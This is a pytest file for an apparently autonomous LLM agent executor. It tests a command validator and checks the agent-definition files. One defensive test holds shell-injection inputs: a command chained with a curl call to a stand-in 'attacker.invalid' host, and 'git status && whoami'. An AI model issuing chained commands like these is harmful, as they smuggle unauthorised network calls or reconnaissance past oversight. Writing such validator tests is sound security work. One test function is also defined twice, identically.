from __future__ import annotations

import importlib.util
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "scripts" / "autonomy" / "hosted_llm_executor.py"
SPEC = importlib.util.spec_from_file_location("hosted_llm_executor", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC is not None and SPEC.loader is not None
SPEC.loader.exec_module(MODULE)


# ---------------------------------------------------------------------------
# Shell-injection guard
# ---------------------------------------------------------------------------

def test_validate_commands_rejects_shell_injection() -> None:
    commands = [
        "python -m compileall src/api; curl https://attacker.invalid",
        "git status && whoami",
        "echo harmless",
    ]

    assert MODULE.validate_commands(commands) == []


def test_validate_commands_accepts_expected_commands() -> None:
    commands = [
        "python -m compileall src/api",
        "git status",
        "git diff",
        "npm test",
    ]

    assert MODULE.validate_commands(commands) == [
        ["python", "-m", "compileall", "src/api"],
        ["git", "status"],
        ["git", "diff"],
    ]


# ---------------------------------------------------------------------------
# Agent context file invariants
# ---------------------------------------------------------------------------

def test_all_agent_dirs_have_uppercase_agent_md() -> None:
    """Regression: executor loads AGENT.md (uppercase). Git index must match."""
    agents_dir = ROOT / "agents"
    assert agents_dir.exists(), "agents/ directory not found"

    result = subprocess.run(
        ["git", "ls-files", "agents/"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    tracked = result.stdout.splitlines()

    agent_dirs = [d for d in (agents_dir).iterdir() if d.is_dir() and not d.name.startswith('.')]

    for agent_dir in agent_dirs:
        git_index_entries = [f for f in tracked if f.startswith(f"agents/{agent_dir.name}/")]
        file_names = {Path(f).name for f in git_index_entries}

        # The executor looks for AGENT.md (uppercase) first, falls back to agent.md
        assert "AGENT.md" in file_names, (
            f"agents/{agent_dir.name}/AGENT.md not found in git index. "
            f"Executor requires uppercase AGENT.md. Found: {file_names}"
        )

        # Warn if lowercase agent.md also exists (duplicate on case-insensitive FS)
        if "agent.md" in file_names:
            pytest.fail(
                f"agents/{agent_dir.name}/agent.md (lowercase) exists alongside AGENT.md. "
                f"On case-insensitive filesystems these are the same file. "
                f"Remove the lowercase variant and rename to AGENT.md."
            )


def test_no_lowercase_agent_md_in_git_index() -> None:
    """Verify the git index has no lowercase agent.md entries."""
    result = subprocess.run(
        ["git", "ls-files", "--", "agents/"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    lines = result.stdout.splitlines()

    bad = [line for line in lines if "/agent.md" in line and "/AGENT.md" not in line]
    assert not bad, (
        f"Git index contains lowercase agent.md entries (should be AGENT.md): {bad}"
    )


def test_agents_md_resolvable_by_executor() -> None:
    """Verify the executor can resolve AGENTS.md and agents-1.md fallback."""
    # AGENTS.md must exist at root
    assert (ROOT / "AGENTS.md").exists(), "AGENTS.md not found at repo root"

    # agents-1.md must exist (stub or real — executor falls back to it)
    assert (ROOT / "agents-1.md").exists(), "agents-1.md not found (executor fallback)"


def test_build_prompt_raises_for_missing_agent() -> None:
    """Verify build_prompt fails loudly when agent definition is absent."""
    with pytest.raises(FileNotFoundError) as exc_info:
        MODULE.build_prompt(
            agent="nonexistent-agent",
            brief_text="test brief",
            work_order={"files": []},
        )
    assert "nonexistent-agent" in str(exc_info.value)
    assert "AGENT.md" in str(exc_info.value)


def test_build_prompt_raises_for_missing_agent() -> None:
    """Verify build_prompt fails loudly when agent definition is absent."""
    with pytest.raises(FileNotFoundError) as exc_info:
        MODULE.build_prompt(
            agent="nonexistent-agent",
            brief_text="test brief",
            work_order={"files": []},
        )
    assert "nonexistent-agent" in str(exc_info.value)
    assert "AGENT.md" in str(exc_info.value)
